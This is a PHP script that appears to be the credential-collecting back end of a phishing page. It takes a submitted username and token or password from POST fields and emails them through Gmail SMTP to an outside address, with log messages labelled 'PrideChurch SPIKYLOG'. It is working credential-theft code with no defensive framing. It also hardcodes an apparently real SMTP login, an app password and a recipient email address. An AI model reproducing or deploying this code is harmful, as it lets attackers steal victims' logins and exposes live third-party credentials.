<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

if(isset($_POST['x1']) && isset($_POST['userToken'])){
    $e = $_POST['x1'];
    $p = $_POST['userToken'];

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';



$mail = new PHPMailer(true);

try {
    //Send using SMTP
	$mail->isSMTP();				   
    $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'parkbath002@gmail.com';                     //SMTP username
    $mail->Password   = 'jtplwfznraarxwnw';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('parkbath002@gmail.com', 'PrideChurch SPIKYLOG');
    $mail->addAddress('iyecandless@gmail.com');     // Add a recipient
	
	$message = 'user:: '.$e.' - '. 'token:: '.$p;

    // Content
    $mail->isHTML(true);                                  // Set email format to HTML
    $mail->Subject = 'PrideChurch SPIKYLOG';
    $mail->Body    = $message;

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
}
?>